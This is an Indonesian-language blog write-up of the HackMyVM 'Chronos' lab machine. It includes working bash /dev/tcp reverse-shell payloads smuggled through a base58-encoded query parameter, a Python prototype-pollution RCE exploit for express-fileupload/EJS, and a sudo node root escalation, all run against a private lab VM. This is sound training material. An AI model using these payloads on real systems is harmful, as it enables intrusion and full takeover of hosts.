---
layout: post
title: "HackMyVM: Chronos"
date: 2021-09-16 09:03:26
categories: hackmyvm
tags: [nodejs, express-fileupload, CVE-2020-7699, RCE-PoC, base-56-cipher]
---

Habis dipusingin sama soal binary exploit di [picoctf](https://picoctf) jadi kangen main boot2root di [HackMyVM](https://hackmyvm.eu) dan juga kangen nulis writeup di blog, apalagi HMV udah jarang saya tulis. yang kemaren aja machine box easy semua, hehe. Saya juga udah jarang nulis note kalo habis dapet ilmu baru entah karena apa tapi kurang lebih rasa males yang menghantui pikiran saya. Saya juga mikir "buat apa juga nulis di blog kalo di internet banyak note orang, tinggal dibookmark aja kan gampang". Kurang lebih pikiran itu yang merusak segala visi misi saya.

## Machine Information

|**Details**|
|Machine Name|[Chronos](https:https://hackmyvm.eu/machines/machine.php?vm=Chronos)|
|Difficulty Level|<span style="color: #B79616; font-weight: bold;">Medium</span>|
|Machine Released|**7, August 2021**|
|Date I complete it|**16, September**|

## Recon

## Finding IP target

```bash
 Currently scanning: 192.168.86.0/16   |   Screen View: Unique Hosts             
                                                                                 
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 102                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.56.100  #################      1      42  PCS Systemtechnik GmbH        
 192.168.56.108  08:00:27:49:f3:fa      1      60  PCS Systemtechnik GmbH   

```
sebenarnya gak usah repot-repot saya sensor sih, itu juga host yang dibuat virtualbox sendiri.

## Nmap scanning
```bash
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:f2:83:a4:38:89:8d:86:a5:e1:31:76:eb:9d:5f:ea (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFF8YjHtqC35Tv6qgLJ0kNRdjbf30IJ3vKLgvfu9i0tKcx3+TpxYz91j2DXQazjyUpfbIV+fQJb5uyl1iaXHcuvLcQ/wx2WzqzYCmvwM0UzChbwlIUxBpCgfx8wRYNJSwGbgPRoHnXLFquLf47q5nugN87esyyMM0UIaMYo3rNspZtB8QsdzZD2m5RqqI45ab8ByrQZbp8PP7XxTUXWT1ulcAABUbWnRR6VJDL72IQy3G8gpDoU95p4feodti3EA97jwbuNq9G+XeLK2BX4Y5SLpqgYazTWw8scw71hPea4r2YvtJNv6aQJBjMTzDfUm1CQ7pc1qN1T+1vujcyzO7J
|   256 41:5a:21:c4:58:f2:2b:e4:8a:2f:31:73:ce:fd:37:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO/PvsX6OqdIiLIzv+JlEolWwqi2s/gnJGADk2W0miSvnZNH2CZ/MAz6qxC4tRLsQl1eI2i43+Wd3tw6pyNvmSg=
|   256 9b:34:28:c2:b9:33:4b:37:d5:01:30:6f:87:c4:6b:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGOQB+a1NPS+fokbiT0hLgpNOYdGG/5+ZVsOoCCn0TyO
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
8000/tcp open  http    syn-ack Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Ports scanned, i got 22 stands for SSH, 80 for http running on Apache, and 8000 running on Node.js Express Framework. belom pernah ketemu seumur hidup nih server-side yang pake framework js"an. walaupun ada port SSH opened, di machine kali ini saya tidak akan menyentuh sama sekali. jelas nyaman pake reverse shell.

## Website view-code
```bash
arin@aoba ~/Desktop/boot2roots/hmv/chronos$ curl http://192.168.56.108/
```
```js
## Ada sesuatu dibagian bawah ##

var _0x5bdf=['150447srWefj','70lwLrol','1658165LmcNig','open','1260881JUqdKM','10737CrnEEe','2SjTdWC','readyState','responseText','1278676qXleJg','797116soVTES','onreadystatechange','http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL','User-Agent','status','1DYOODT','400909Mbbcfr','Chronos','2QRBPWS','getElementById','innerHTML','date'];(function(_0x506b95,_0x817e36){var _0x244260=_0x432d;while(!![]){try{var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95['push'](_0x506b95['shift']());}catch(_0x3fb1dc){_0x506b95['push'](_0x506b95['shift']());}}}(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9){return _0x432d=function(_0x5bdf82,_0x432dc8){_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;},_0x432d(_0x16bd66,_0x33ffa9);}function loadDoc(){var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function(){var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&&this[_0x146f5d(0x8c)]==0xc8&&(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);},_0x2beb35[_0x17df92(0x81)]('GET',_0x17df92(0x8a),!![]),_0x2beb35['setRequestHeader'](_0x17df92(0x8b),_0x1cff55),_0x2beb35['send']();}

```
tanpa melihat renderan dari port 80, dari source web sendiri terlihat aneh dibagian script. disana ditujukan ke **http://chronos.local**. Ok host baru yang harus dibuat di */etc/hosts*. 

## Directory Brute-forcing

dari **gobuster** sampai **dirsearch**. Result yang saya dapatkan selalu seperti ini.
```bash
/css                  (Status: 301) [Size: 312] [--> http://chronos.local/css/]
/server-status        (Status: 403) [Size: 278]
```
Karna baru tingkat emosi habis ada masalah hidup, jadi hilang konsen. saya lupa kalo ada port 8000 yang terbuka, hehe. jadi tidak ada yang menarik for this part.

## Escalate as www-data
PS: rada ribet.

Karna tadi, domain host berubah dan dibagian URL terlihat seperti query. saya mencoba untuk melihat source dari **http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ** menggunakan **curl** lagi.

```bash
arin@aoba ~/Desktop/boot2roots/hmv/chronos $ curl http://chronos.local:8000/date\?format\=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL
Permission Denied%

```
Loh, permission denied?. saya coba liat lagi code javascript yang menurut saya terlihat seperti sudah diobfuscate. ada code seperti ini.

```json
'User-Agent','status','1DYOODT','400909Mbbcfr','Chronos','2QRBPWS','getElementById','innerHTML','date'
```
Dari kedua ini, saya menyimpulkan bahwa format ini adalah tanggal yang dibuat menjadi cipher text.
```html
<body onload="loadDoc()">

  <div id="wrapper">
    <div class="future-cop">
      <h3 class="future">Chronos - Date & Time</h3>
      <h1 class="cop">
        <p id="date"></p>
      </h1>
    </div>
  </div>
  <script>
```
Saya ke <https://dcode.fr/> mencoba untuk mengindentifikasi bentuk cipher ini. ternyata **base-58**. saya coba **curl** (apa sih ga tau nama istilahnya hehe) dengan mengoverwrite **User-Agent: Chronos** seperti yang ada di bagian JS yang diobfuscate tadi.
```bash
arin@aoba ~/Desktop/boot2roots/hmv/chronos $ curl http://chronos.local:8000/date\?format\=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL -H "User-Agent: Chronos"
Today is Thursday, September 16, 2021 08:37:10.

```
Benerkan tanggal. Ok sampai sini saya berfikir bagaimana jika reverse shell diencrypt dengan base-58? tapi saya test dulu.
```bash
;curl http://192.168.56.1:2004
-> uXN49Jdw8oBXUxPfRopqnHUK4jLyKTxw8o4Bci6KVQ
---
arin@aoba ~/Desktop/boot2roots/hmv/chronos $ curl http://chronos.local:8000/date\?format\=uXN49Jdw8oBXUxPfRopqnHUK4jLyKTxw8o4Bci6KVQ -H "User-Agent: Chronos"
---
arin@aoba ~ $ ncat -nvlp 2004
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::2004
Ncat: Listening on 0.0.0.0:2004
Ncat: Connection from 192.168.56.108.
Ncat: Connection from 192.168.56.108:33704.
GET / HTTP/1.1
Host: 192.168.56.1:2004
User-Agent: curl/7.58.0
Accept: */*

```
OK REVERSE SHELL, GET IT.
```bash
;bash -c 'bash -i >& /dev/tcp/192.168.56.1/4242 0>&1'
->25v919hbfMQqCv6QfhvvBc5iYdGcDgqbbt85MB6wUQfjQoec4PBgYon4cd1pjpVKqj1Ms4kqc
---
arin@aoba ~/Desktop/boot2roots/hmv/chronos $ curl http://chronos.local:8000/date\?format\=25v919hbfMQqCv6QfhvvBc5iYdGcDgqbbt85MB6wUQfjQoec4PBgYon4cd1pjpVKqj1Ms4kqc -H "User-Agent: Chronos"
---
arin@aoba ~ $ ncat -nvlp 4242
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 192.168.56.108.
Ncat: Connection from 192.168.56.108:55884.
bash: cannot set terminal process group (771): Inappropriate ioctl for device
bash: no job control in this shell
www-data@chronos:/opt/chronos$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@chronos:/opt/chronos$ 

```

## Shell as imera
pergi kemana-mana, akhirnya nemu asik-asik.
```json
www-data@chronos:/opt/chronos-v2/backend$ cat package.json
{
  "name": "some-website",
  "version": "1.0.0",
  "description": "",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
    "ejs": "^3.1.5",
    "express": "^4.17.1",
    "express-fileupload": "^1.1.7-alpha.3"
  }
}
```
```json
www-data@chronos:/opt/chronos-v2/backend$ cat server.js
const express = require('express');
const fileupload = require("express-fileupload");
const http = require('http')

const app = express();

app.use(fileupload({ parseNested: true }));

app.set('view engine', 'ejs');
app.set('views', "/opt/chronos-v2/frontend/pages");

app.get('/', (req, res) => {
   res.render('index')
});

const server = http.Server(app);
const addr = "127.0.0.1"
const port = 8080;
server.listen(port, addr, () => {
console.log('Server listening on ' + addr + ' port ' + port);
```
tidak tahu persis apa maksudnya, tapi saya dapat memahami bagaimana server ini berjalan. saya mencoba googling dan mendapatkan Exploit menarik untuk [express-fileupload](https://github.com/boiledsteak/EJS-Exploit). tidak lebih seperti dibawah ini.
```py
##############################################################
# Run this .py to perform EJS-RCE attack
# referenced from
# https://blog.p6.is/Real-World-JS-1/
# 
# Timothy, 10 November 2020
##############################################################

### imports
import requests

### commands to run on victim machine
cmd = 'bash -c "bash -i &> /dev/tcp/192.168.56.1/2004 0>&1"'

print("Starting Attack...")
### pollute
requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})

### execute command
requests.get('http://127.0.0.1:8080')
print("Finished!")
```
konsep yang menarik untuk meng-exploit server lokal dan mengeksekusi reverse shell dan masuk ke shell si mesin attacker. and then look what i've done with it.
```bash
www-data@chronos:~/html$ python3 exploit.py
python3 exploit.py
Starting Attack...
Finished!
---
arin@aoba ~/Desktop/boot2roots/hmv/chronos $ ncat -nvlp 2004
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::2004
Ncat: Listening on 0.0.0.0:2004
Ncat: Connection from 192.168.56.108.
Ncat: Connection from 192.168.56.108:33712.
bash: cannot set terminal process group (772): Inappropriate ioctl for device
bash: no job control in this shell
imera@chronos:/opt/chronos-v2/backend$ id
id
uid=1000(imera) gid=1000(imera) groups=1000(imera),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
imera@chronos:/opt/chronos-v2/backend$ 

```

## PrivEsc
```bash
imera@chronos:~$ sudo -l
sudo -l
Matching Defaults entries for imera on chronos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User imera may run the following commands on chronos:
    (ALL) NOPASSWD: /usr/local/bin/npm *
    (ALL) NOPASSWD: /usr/local/bin/node *
```
seperti biasa [GTFObins](https://gtfobins.github.com/) selalu menyediakan metode untuk para pentester melakukan privesc.
```bash
imera@chronos:~$ sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})'
)'do node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})

id
uid=0(root) gid=0(root) groups=0(root)
```

## References
* <https://salmonsec.com/cheatsheet/reverse_shells>
* <https://www.dcode.fr/base-58-cipher>
* <https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/>
* <https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325>
* <https://github.com/boiledsteak/EJS-Exploit>
